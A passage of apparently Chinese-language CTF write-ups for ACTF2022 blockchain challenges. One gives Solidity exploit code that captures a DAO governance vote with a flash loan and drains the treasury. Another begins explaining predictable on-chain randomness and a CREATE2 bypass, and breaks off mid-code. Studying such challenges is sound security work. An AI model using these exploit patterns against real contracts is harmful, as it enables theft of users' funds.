keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">46027</span><span class="token punctuation">;</span> <span class="token comment">// 1 week</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">proposalThreshold</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> override <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>合约的主要内容为</p><ul><li>提案的基准票数百分比为4%</li><li>提案要求持有最低token为0，即谁都可以发送提案</li><li>提案开始投票时间为10个Block</li><li>提案持续时间为46027个Block</li></ul><p>显然我们是等不到46027个Block的，所以我们需要用到<code>emergencyExecuteRightNow</code>立即执行提案。</p><p>查阅代码发<code>emergencyExecuteRightNow</code>需要满足条件</p><ul><li>_quorumReachedEmergency(proposalId)<ul><li>proposalvote.forVotes &gt; proposalvote.againstVotes*2</li></ul></li><li>_voteSucceededEmergency(proposalId))<ul><li>quorum(proposalSnapshot(proposalId)) *2 &lt;= proposalvote.forVotes + proposalvote.abstainVotes;</li></ul></li></ul><p>即赞成票大于反对票的2倍，并且大于4%*2=8%</p><p>因为提案无门槛，并且我们拥有闪电贷，借出大于8%的token，所以很容易可以构造一个攻击提案，将Gov合约中的所有AAA token都转到攻击者中。</p><h2 id="恶意提案"><a href="#恶意提案" class="headerlink" title="恶意提案"></a>恶意提案</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">Proposal</span> <span class="token punctuation">{</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> immutable TokenAddress<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> immutable GovernorAddress<span class="token punctuation">;</span>     <span class="token builtin">address</span> <span class="token keyword">public</span> immutable  HackerAddress<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">,</span><span class="token builtin">address</span> gov<span class="token punctuation">)</span><span class="token punctuation">{</span>        TokenAddress <span class="token operator">=</span> token<span class="token punctuation">;</span>        GovernorAddress <span class="token operator">=</span> gov<span class="token punctuation">;</span>        HackerAddress <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">executeProposal</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        AAA a <span class="token operator">=</span> <span class="token function">AAA</span><span class="token punctuation">(</span>TokenAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>HackerAddress<span class="token punctuation">,</span> a<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>GovernorAddress<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>恶意提案内容很简单，即将Gov合约中的所有AAA token转移到攻击者中。</p><p>这里出现了一个问题，在调试时发现所有地址都是0，后来查阅资料得知executeProposal是delegatecall调用的，使用的合约上下文是目标合约(gov合约)，所以必须将需要的addresss设为常量写死。官方解释为</p><blockquote><p> constant and immutable variables do not occupy a storage slot, they are injected in the bytecode at compile time. </p></blockquote><p>而constant 和 immutable 的区别是constant必须在初始化时赋值，<strong>immutable可以在构造函数中赋值</strong>，因此在这我们选择immutable。</p><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">Hacker</span> <span class="token punctuation">{</span>    AAA <span class="token keyword">public</span> a<span class="token punctuation">;</span>    Gov <span class="token keyword">public</span> g<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> ProposalAddress<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> pid<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">,</span> <span class="token builtin">address</span> gov<span class="token punctuation">)</span> <span class="token punctuation">{</span>        a <span class="token operator">=</span> <span class="token function">AAA</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>        g <span class="token operator">=</span> <span class="token function">Gov</span><span class="token punctuation">(</span><span class="token keyword">payable</span><span class="token punctuation">(</span>gov<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ProposalAddress <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Proposal</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span>gov<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> _addr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _addr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> ProposalAddress<span class="token punctuation">;</span>        <span class="token builtin">uint256</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> _value <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">uint256</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token builtin">bytes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> _sig <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bytes</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _sig<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"executeProposal()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">string</span> <span class="token keyword">memory</span> _desc <span class="token operator">=</span> <span class="token string">"114514"</span><span class="token punctuation">;</span>        pid <span class="token operator">=</span> g<span class="token punctuation">.</span><span class="token function">propose</span><span class="token punctuation">(</span>_addr<span class="token punctuation">,</span> _value<span class="token punctuation">,</span> _sig<span class="token punctuation">,</span> _desc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">Hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        a<span class="token punctuation">.</span><span class="token function">flashLoan</span><span class="token punctuation">(</span>            <span class="token function">IERC3156FlashBorrower</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token builtin">address</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>            a<span class="token punctuation">.</span><span class="token function">totalSupply</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">,</span>            <span class="token string">""</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">onFlashLoan</span><span class="token punctuation">(</span>        <span class="token builtin">address</span> initiator<span class="token punctuation">,</span>        <span class="token builtin">address</span> token<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> amount<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> fee<span class="token punctuation">,</span>        <span class="token builtin">bytes</span> <span class="token keyword">calldata</span> data    <span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bytes32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        a<span class="token punctuation">.</span><span class="token function">delegate</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> _addr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _addr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> ProposalAddress<span class="token punctuation">;</span>        <span class="token builtin">uint256</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> _value <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">uint256</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token builtin">bytes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> _sig <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bytes</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _sig<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"executeProposal()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">string</span> <span class="token keyword">memory</span> _desc <span class="token operator">=</span> <span class="token string">"114514"</span><span class="token punctuation">;</span>        g<span class="token punctuation">.</span><span class="token function">castVote</span><span class="token punctuation">(</span>pid<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        g<span class="token punctuation">.</span><span class="token function">emergencyExecuteRightNow</span><span class="token punctuation">(</span>_addr<span class="token punctuation">,</span> _value<span class="token punctuation">,</span> _sig<span class="token punctuation">,</span> <span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>_desc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">increaseAllowance</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> amount <span class="token operator">+</span> fee<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"ERC3156FlashBorrower.onFlashLoan"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击合约的逻辑比较复杂，在这里我们一一解读</p><p>首先在构造函数中我们使用了构造了恶意提案并且进行了提案。<br>propose函数传参为</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">propose</span><span class="token punctuation">(</span>        <span class="token builtin">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> targets<span class="token punctuation">,</span>        <span class="token builtin">uint256</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> values<span class="token punctuation">,</span>        <span class="token builtin">bytes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> calldatas<span class="token punctuation">,</span>        <span class="token builtin">string</span> <span class="token keyword">memory</span> description    <span class="token punctuation">)</span> <span class="token keyword">public</span> virtual <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span> proposalId<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>targets即为提案的合约地址</li><li>values指提案需要发送的values，这里不用，我们设为0</li><li>calldatas为执行提案的calldata，这里我们填入executeProposal的signature即可</li><li>description为提案的描述，这里我们随便填一个数</li></ul><p>完成提案后我们得到了提案的id，记为pid，在后续执行提案时会用到。</p><p>接下来便是我们的闪电贷合约，这里我们选择贷走10%的token，符合了紧急执行提案的条件。</p><p>闪电贷的逻辑中，我们首先将代理投票权给了hacker。然后进行投票，投1即是支持。</p><p>之后进行了紧急执行，执行之后再授权给AAA合约amount+fee的额度以偿还闪电贷。</p><p>至此，攻击完成了，gov合约中的所有token都被转移到了hacker合约中。</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">testexp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"token:"</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"gov:"</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span>gov<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hacker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span>gov<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Hacker Address"</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span>hacker<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        vm<span class="token punctuation">.</span><span class="token function">roll</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"block number:"</span><span class="token punctuation">,</span>block<span class="token punctuation">.</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>        hacker<span class="token punctuation">.</span><span class="token function">Hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Balance of gov"</span><span class="token punctuation">,</span>token<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>gov<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Balance of hacker"</span><span class="token punctuation">,</span>token<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>hacker<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有一个小问题，我在复现时使用的foundry进行测试，但是投票需要10个区块之后，不过还好foundry有cheatcodes机制，可以轻松改变区块高度。</p><p><img src="/../img/AAADAO.png" alt="image"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本题在AAA举办的ACTF中出现，也是第一次见到DAO背景下的CTF，并且结合了闪电贷攻击，非常有意思。</p><p>本题最大的攻击点就在于任何人都可以发起提案，所以我们开发者在创立或者维护DAO的时候，一定一定要注意合约安全问题，不然一不小心就是巨额损失。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2022 betloss2</title>
      <link href="/2022/08/31/actf2022-betloss2/"/>
      <url>/2022/08/31/actf2022-betloss2/</url>
      
        <content type="html"><![CDATA[<h1 id="ACTF-writeup"><a href="#ACTF-writeup" class="headerlink" title="ACTF writeup"></a>ACTF writeup</h1><p>本次ACTF中出现了三道区块链类型的题目，并且题目质量都很高。遗憾的是，我在比赛时没有完成一道。这里在赛后进行复盘。</p><h2 id="bet2loss"><a href="#bet2loss" class="headerlink" title="bet2loss"></a>bet2loss</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">BetToken</span> <span class="token punctuation">{</span>    <span class="token comment">/* owner */</span>    <span class="token builtin">address</span> owner<span class="token punctuation">;</span>    <span class="token comment">/* token related */</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>    <span class="token comment">/* random related */</span>    <span class="token builtin">uint256</span> nonce<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> cost<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> lasttime<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token keyword">public</span> airdroprecord<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> logger<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100000</span><span class="token punctuation">;</span>        nonce <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        cost <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        lasttime <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">seal</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span><span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">,</span> <span class="token string">"you are not owner"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>to<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">checkWin</span><span class="token punctuation">(</span><span class="token builtin">address</span> candidate<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span><span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">,</span> <span class="token string">"you are not owner"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>candidate <span class="token operator">!=</span> owner<span class="token punctuation">,</span> <span class="token string">"you are cheating"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>candidate<span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">2000</span><span class="token punctuation">,</span> <span class="token string">"you still not win"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>owner<span class="token punctuation">]</span> <span class="token operator">+=</span> balances<span class="token punctuation">[</span>candidate<span class="token punctuation">]</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>candidate<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">transferTo</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>amount <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"this function is not impelmented yet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">airdrop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>            airdroprecord<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token string">"you already got your airdop"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        airdroprecord<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">30</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">bet</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> value<span class="token punctuation">,</span> <span class="token builtin">uint256</span> mod<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        <span class="token builtin">address</span> _addr <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>        <span class="token comment">// make sure pseudo-random is strong</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>lasttime <span class="token operator">!=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>mod <span class="token operator">&gt;=</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> mod <span class="token operator">&lt;=</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>logger<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> cost<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// watchout, the sender need to approve such first</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> cost<span class="token punctuation">;</span>        <span class="token comment">// limit</span>        value <span class="token operator">=</span> value <span class="token operator">%</span> mod<span class="token punctuation">;</span>        <span class="token comment">// not contract</span>        <span class="token builtin">uint32</span> size<span class="token punctuation">;</span>        <span class="token keyword">assembly</span> <span class="token punctuation">{</span>            size <span class="token operator">:=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span>_addr<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// rnd gen</span>        <span class="token builtin">uint256</span> rand <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span>            <span class="token function">keccak256</span><span class="token punctuation">(</span>                abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>                    nonce<span class="token punctuation">,</span>                    block<span class="token punctuation">.</span>timestamp<span class="token punctuation">,</span>                    block<span class="token punctuation">.</span>difficulty<span class="token punctuation">,</span>                    msg<span class="token punctuation">.</span>sender                <span class="token punctuation">)</span>            <span class="token punctuation">)</span>        <span class="token punctuation">)</span> <span class="token operator">%</span> mod<span class="token punctuation">;</span>        nonce <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        lasttime <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">;</span>        <span class="token comment">// for one, max to win 12 * 12 - 10 == 134</span>        <span class="token comment">// if 20 times all right, will win 2680</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> rand<span class="token punctuation">)</span> <span class="token punctuation">{</span>            balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> cost <span class="token operator">*</span> mod<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>阅读源码可知，合约构建了一个赌场，每次投注都会生成一个随机数，这个<strong>随机数是由区块的时间、难度、投注者的地址组成的</strong>。用户初始可以Airdrop 30个token，每次投注都会扣除10个token。投注成功可以获得<code>cost*mod</code>个token的奖励。20轮之后，如果用户拥有2000个token以上，就可以得到flag。</p><p>合约中并没有实现<code>Transfer</code>方法，所以不能通过薅羊毛的方式去获取flag。</p><p>本题考察了<strong>区块链上随机数的生成</strong>以及<strong>Create2操作码</strong>的使用。题目中使用的随机数都是根据区块链上公开可以获取的信息生成的。因此，我们也可以用一个合约去<strong>获取同一个区块上的同样的随机数</strong>。这样便可以达到百发百中。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>刚开始的想法是，是在合约中使用call方法去调用，但是题目中要求<strong>合约账户不能调用bet方法</strong>。</p><p>这里我们使用CREATE2操作码，在<strong>同一个地址上反复部署合约后自毁</strong>，从而绕过非合约方法的验证。</p><p>其中<code>nonce</code>的值写在区块链中，需要通过<code>getStorageAt</code>方法获取。</p><h3 id="Create2"><a href="#Create2" class="headerlink" title="Create2"></a>Create2</h3><p>CREATE2 操作码，它允许我们提前计算出要部署的合约地址，地址计算公式如下：</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity">keccak256 <span class="token punctuation">(</span><span class="token number">0xff</span> <span class="token operator">++</span> <span class="token builtin">address</span> <span class="token operator">++</span> salt <span class="token operator">++</span> keccak256 <span class="token punctuation">(</span>init_code<span class="token punctuation">)</span><span class="token 